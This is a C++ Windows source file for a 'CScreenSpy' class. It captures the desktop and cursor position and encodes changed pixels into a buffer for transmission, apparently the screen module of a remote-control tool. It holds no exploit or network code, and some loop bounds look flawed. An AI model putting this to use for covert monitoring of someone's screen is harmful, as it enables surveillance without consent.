#include "stdafx.h"
#include "ScreenSpy.h"


CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	//将源矩形直接复制到目标矩形
	m_dwBitBltRop = SRCCOPY;
	m_BitmapInfor_Full = NULL;
	switch (ulbiBitCount)
	{
	case 16:
	case 32:
	{
		m_ulbiBitCount = ulbiBitCount;
	}
	default:
		break;
	}
	//获得当前窗口的句柄
	m_DeskTopWndHandle = GetDesktopWindow();
	//获得当前窗口设备
	m_hFullDC = GetDC(m_DeskTopWndHandle);
	//创建一个与m_hFullDC相对应的单位上下设备上下文
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);

	//获得屏幕分辨率
	m_ulFullWidth = ::GetSystemMetrics(SM_CXSCREEN);    //屏幕的分辨率
	m_ulFullHeight = ::GetSystemMetrics(SM_CYSCREEN);
	//构建bitmap 消息
	m_BitmapInfor_Full = ConstructBI(m_ulbiBitCount, m_ulFullWidth, m_ulFullHeight);

	m_BitmapData_Full = NULL;
	//创建应用程序可以直接写入的、与设备无关的位图（DIB）的函数。
	m_BitmapHandle = ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full,
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];
	m_RectBufferOffset = 0;
	m_hDiffMemDC = CreateCompatibleDC(m_hFullDC);
	m_DiffBitmapHandle = ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full,
		DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);
}


CScreenSpy::~CScreenSpy()
{
	//ReleaseDC(m_DeskTopWndHandle, m_hFullDC);   //GetDC
	if (m_hFullMemDC != NULL)
	{
		DeleteDC(m_hFullMemDC);                //Create匹配内存DC

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full != NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;

	}

	if (m_hDiffMemDC != NULL)
	{
		DeleteDC(m_hDiffMemDC);                //Create匹配内存DC

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full != NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}


	if (m_BitmapInfor_Full != NULL)
	{
		delete[] m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}

LPBITMAPINFO CScreenSpy::ConstructBI(ULONG ulBitCount, ULONG ulFullWidth, ULONG ulFullHeight)
{
	int ColorNum = ulBitCount <= 8 ? 1 << ulBitCount : 0;

	ULONG ulBitmapLength = sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
	BITMAPINFO* BitmapInfor = (BITMAPINFO*)new BYTE[ulBitmapLength];

	BITMAPINFOHEADER* BitmapInforHeader = &(BitmapInfor->bmiHeader);

	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);//pi si 
	BitmapInforHeader->biWidth = ulFullWidth; //1080
	BitmapInforHeader->biHeight = ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;  //必须设置为1
	BitmapInforHeader->biBitCount = ulBitCount; //16
	BitmapInforHeader->biCompression = BI_RGB;   //未经过压缩的RGB
	BitmapInforHeader->biXPelsPerMeter = 0;
	BitmapInforHeader->biYPelsPerMeter = 0;
	BitmapInforHeader->biClrUsed = 0;
	BitmapInforHeader->biClrImportant = 0;
	BitmapInforHeader->biSizeImage =
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31) / 32) 
		* 4 * BitmapInforHeader->biHeight;

	return BitmapInfor;
}

ULONG CScreenSpy::GetBISize()
{
	ULONG ColorNum = m_ulbiBitCount < 8 ? 1 << m_ulbiBitCount : 0;
	return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
}
LPBITMAPINFO CScreenSpy::GetBIData()
{
	return m_BitmapInfor_Full;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//用于从原设备中复制位图到目标设备
	::BitBlt(m_hFullMemDC, 0, 0,
		m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
	return m_BitmapData_Full;
}

ULONG CScreenSpy::GetFirstScreenLength()
{
	return m_BitmapInfor_Full->bmiHeader.biSizeImage;
}

LPVOID CScreenSpy::GetNextScreenData(ULONG * ulNextSendLength)
{
	if (ulNextSendLength == 0 || m_RectBuffer == NULL)
	{
		return NULL;
	}
	// 重置rect缓冲区指针
	m_RectBufferOffset = 0;

	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// 写入光标位置
	POINT CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	BYTE bCursorIndex = m_CursorInfor.GetCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// 分段扫描全屏幕  将新的位图放入到m_hDiffMemDC中
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth,
			m_BitmapInfor_Full->bmiHeader.biHeight);
		//两个Bit进行比较如果不一样修改m_lpvFullBits中的返回
		*ulNextSendLength = m_RectBufferOffset +
			CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full,
				m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);
		return m_RectBuffer;
	}
	return NULL;
}

VOID CScreenSpy::WriteRectBuffer(LPBYTE szBuffer, ULONG ulLength)
{
	memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);
	m_RectBufferOffset += ulLength;
}

VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
	ULONG ulJumpLine = 50;
	ULONG ulJumpSleep = ulJumpLine / 10;
	int ulToJump = 0;
	for (int i = 0; i < ulHeight;i += ulToJump)
	{
		ULONG ulV1 = ulHeight - i;
		if (ulV1 > ulJumpLine)
		{
			ulToJump = ulJumpLine;
		}
		else
		{
			ulToJump = ulV1;
		}
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour, 0, i, m_dwBitBltRop);
		Sleep(ulJumpSleep);
	}
}

ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
	LPBYTE szBuffer, DWORD ulCompareLength)
{
	// Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
	LPDWORD p1, p2;
	p1 = (LPDWORD)CompareDestData;
	p2 = (LPDWORD)CompareSourData;

	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0;
	ULONG ulCount = 0;
	for (int i = 0; i < ulCompareLength;i +=4,p1++,p2++)
	{
		if (*p1 == *p2)
		{
			continue;
		}
		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;
		ulv1 = ulszBufferOffset + sizeof(int);
		ulv2 = ulv1 + sizeof(int);
		ulCount = 0;
		// 更新Dest中的数据
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		ulCount += 4;
		i += 4, p1++, p2++;
		for (int j = 0; j < ulCompareLength;i += 4,j += 4,p1++,p2++)
		{
			if (*p1 == *p2)
			{
				break;
			}
			// 更新Dest中的数据
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;
	}
	return ulszBufferOffset;
}
